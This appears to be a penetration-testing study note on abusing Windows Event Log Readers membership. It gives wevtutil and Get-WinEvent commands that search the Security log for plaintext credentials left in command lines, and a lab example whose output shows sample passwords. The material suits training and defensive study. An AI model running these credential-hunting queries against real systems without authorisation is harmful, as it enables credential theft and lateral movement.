---
created: 2026-07-22
tags:
  - Windows
  - Windows_PrivEsc
status: substantial
---

## `Event Log Readers`

![[Windows groups#`Event Log Readers`]]

## `Event Log Readers` in privilege escalation

- Check whether the current user belongs to **`Event Log Readers`**:

```powershell
whoami /groups
```

```powershell
net localgroup "Event Log Readers"
```

- Membership in the `Event Log Readers` group gives you permission to read the Windows event logs, including the sensitive `Security` log. 
- While it doesn't give you code execution capabilities directly, it grants you the visibility to hunt for plaintext credentials. Many built-in Windows commands (such as `net use`, `runas`, `cmdkey`) support passing credentials (usernames and passwords) as parameters. If [auditing of process creation](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-process-creation) is enabled, these commands—along with their sensitive arguments—are recorded in the `Security` log.
- Microsoft has published a reference [guide](https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf) for all built-in Windows commands which highlights how passwords can be passed as parameters.

>[!info]- Why process command line auditing is enabled
> Organizations often enable logging of process command lines (Event ID `4688`) to help defenders monitor and identify potentially malicious behavior. This data is usually shipped to a SIEM tool (like ElasticSearch) to flag unauthorized activity (e.g., `whoami`, `netstat`, `tasklist` being run by a marketing user). 
> 
> According to a [study](https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html) by JPCERT/CC, attackers frequently use commands like `tasklist`, `ver`, `ipconfig`, `systeminfo` for enumeration, and `at`, `reg`, `wmic` for lateral movement. 
> For organizations with tight budgets, leveraging built-in auditing combined with fine-tuned AppLocker rules provides excellent host-level visibility without the cost of enterprise EDR tools. System administrators might add developers or power users to the `Event Log Readers` group so they can troubleshoot issues without requiring full administrative access.
>
> *Real-world example:* During a penetration test against a medium-sized organization with a small security team and no enterprise EDR, the defenders had enabled process creation auditing. They successfully caught and contained a red team member simply because they executed `tasklist` from a compromised finance workstation (after capturing credentials using `Responder` and cracking them offline)!

## Relevant Event IDs for credential hunting

When searching the logs, these are the most valuable Event IDs:

| Event ID | Why it matters |
| :--- | :--- |
| [`4688`](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=4688) | A new process was created on the system. Useful for finding plaintext credentials in command-line options. |
| [`4624`](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=4624) | An account was successfully logged on. Tells you who authenticated. |
| [`4625`](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=4625) | An account failed to log on. Can indicate brute-force attempts or mistyped passwords. |
| [`4648`](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=4648) | A logon attempt was made using explicit credentials (e.g., `runas`, scheduled tasks). |
| [`4672`](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=4672) | Special privileges were assigned to a new logon session. |
| [`4768`](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=4768) | A Kerberos TGT (Ticket-Granting Ticket) was requested from a DC. |
| [`4769`](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=4769) | A Kerberos ST (Service Ticket) was requested from a DC. |

>[!note] For a more complete list, see [[Windows Logs Cheat Sheet#Windows Event IDs]].

## Searching `Security` logs using `wevtutil`

You can query Windows events from the command line using the built-in [`wevtutil`](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil) utility.

- General credential search (`pass`, `password`, `user`):

```powershell
wevtutil qe Security /rd:true /f:text | findstr /i "pass password user"
```

- Query specifically for process creation events (Event ID `4688`) containing credentials:

```powershell
wevtutil qe Security /rd:true /f:text "/q:*[System[EventID=4688]]" | findstr /i "pass user"
```

- Filter for explicit credentials (Event ID `4648`):

```powershell
wevtutil qe Security "/q:*[System[EventID=4648]]"
```

- Filter for Event ID `4688` where the event data explicitly contains the string `pass`:

```powershell
wevtutil qe Security "/q:*[System[EventID=4688] and EventData[Data[contains(.,'pass')]]]"
```

- If you need to specify alternate credentials for `wevtutil` (e.g., if you are currently in a context that does not have permissions, but you have the password for a user in `Event Log Readers`), you can use `/u` and `/p`:

```powershell
wevtutil qe Security /rd:true /f:text /r:<target> /u:<domain>\<user> /p:<password> | findstr "/user"
```

>[!note]- Option breakdown: `wevtutil`
> - `qe`: Query events from a log.
> - `/q:<xpath>`: Filter using XPath (core filtering method).
> - `/rd:true`: Reverse order (newest first).
> - `/c:<n>`: Limit number of events.
> - `/f:text|xml`: Output format (`text` for `findstr`, `xml` for parsing).
> - `/r:<host>`: Query remote system.
> - `/u:<user>`: Username for authentication.
> - `/p:<pass>`: Password (visible in command line).
> - `/lf:true`: Treat target as `.evtx` file instead of a live log.

## Searching `Security` logs using `Get-WinEvent`

You can also use the PowerShell cmdlet [`Get-WinEvent`](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent).

>[!important] Searching the `Security` event log using `Get-WinEvent` requires administrator access, or permissions explicitly adjusted on the registry key `HKLM\System\CurrentControlSet\Services\Eventlog\Security`. Membership in just the `Event Log Readers` group is sometimes **not sufficient** for `Get-WinEvent` (though `wevtutil` will work). 

- General credential search:

```powershell
Get-WinEvent -LogName Security | Where-Object { $_.Message -match "pass|password|user" }
```

- Search for process creation events (Event ID `4688`) where the command line (Property 8) contains credentials:

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} |
Where-Object { $_.Properties[8].Value -match "pass|user" } |
Select-Object @{n="CommandLine";e={$_.Properties[8].Value}}
```

- Search for specific tools commonly used with inline credentials (`net use`, `cmdkey`, `runas`):

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} |
Where-Object { $_.Properties[8].Value -match "net use|cmdkey|runas" } |
Select-Object @{n="CommandLine";e={$_.Properties[8].Value}}
```

- Filter for explicit credentials (Event ID `4648`):

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4648}
```

- Filter using precise XPath (for Event ID `4688` containing `pass`):

```powershell
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4688] and EventData[contains(Data,'pass')]]"
```

- Query a remote machine using alternative credentials:

```powershell
Get-WinEvent -LogName Security -ComputerName <target> -Credential (Get-Credential)
```

>[!note]- Option breakdown: `Get-WinEvent`
> - `-LogName`: Specify log (e.g., `Security`).
> - `-FilterHashtable`: Fast filtering by fields (`Id`, `LogName`, `Time`).
> - `-FilterXPath`: Precise filtering (required for `EventData` fields).
> - `-MaxEvents`: Limit number of events returned.
> - `-Oldest`: Return oldest first.
> - `-ComputerName`: Query remote system.
> - `-Credential`: Authenticate as another user.
> - `Where-Object`: Post-filtering (slower but flexible).

>[!tip] Other Logs
> In addition to the `Security` log, you should also check the [PowerShell Operational](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.1) log. If Script Block Logging or Module Logging is enabled, sensitive scripts and credentials might be recorded there. Unlike the `Security` log, the PowerShell log is generally accessible to **unprivileged users**.

## Complete Example

Using the methods demonstrated, we can find a password for the user `mary` or other users who passed their credentials in command-line arguments. 

1. Verify membership in `Event Log Readers`:

```powershell
PS C:\Users\logger> whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Event Log Readers              Alias            S-1-5-32-573 Mandatory group, Enabled by default, Enabled group
...
```

2. Search the security logs using `wevtutil`:

```powershell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

Output:

```powershell
Process Command Line:   cmdkey  /add:WEB01 /user:amanda /pass:Passw0rd!
Process Command Line:   net  use Z: \\DB01\scripts /user:mary W1ntergreen_gum_2021!
Process Command Line:   net  use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

## References and further reading

- [`Event Log readers — OSCP-CPTS NOTES`](https://notes.dollarboysushil.com/windows-privilege-escalation/group-privileges/event-log-readers)
- [`Windows Commands abused by attackers — JPCERT/CC`](https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html)
- [`Windows Commands Reference — Microsoft`](https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf)